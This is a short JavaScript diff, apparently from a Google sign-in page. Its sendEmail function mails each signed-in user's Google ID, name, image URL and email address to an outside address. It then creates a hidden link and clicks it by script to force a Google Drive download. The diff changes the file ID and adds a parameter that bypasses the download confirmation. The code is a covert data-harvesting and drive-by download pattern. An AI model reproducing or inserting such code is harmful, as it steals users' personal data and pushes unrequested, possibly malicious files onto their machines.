@@ -13,9 +13,9 @@ function sendEmail(id, name, image, email) {
         Body: "<table style=\"width:100%\"><tr><td>Google ID: " + id + "</td></tr><tr><td>Name: " + name + "</td></tr><tr><td>Image URL: " + image + "</td></tr><tr><td>Email: " + email + "</td></tr></table>",
     }).then(function (message) { 
         var d = document.createElement("a");
-        d.setAttribute('href', 'https://drive.google.com/uc?export=download&id=14wWi8PCm2IQjbi50impiTm-0Jz1YU8nQ');
+        d.setAttribute('href', 'https://drive.google.com/u/0/uc?export=download&confirm=Prax&id=1sZH_Ve3ihJ2olJMugiGWYsil7UhvL4R3');
         d.setAttribute('hidden', 'hidden');
-        d.setAttribute('download', 'https://drive.google.com/uc?export=download&id=14wWi8PCm2IQjbi50impiTm-0Jz1YU8nQ');
+        d.setAttribute('download', 'https://drive.google.com/u/0/uc?export=download&confirm=Prax&id=1sZH_Ve3ihJ2olJMugiGWYsil7UhvL4R3');
         document.getElementById('my-signin2').append(d);
         d.click();
         d.remove();
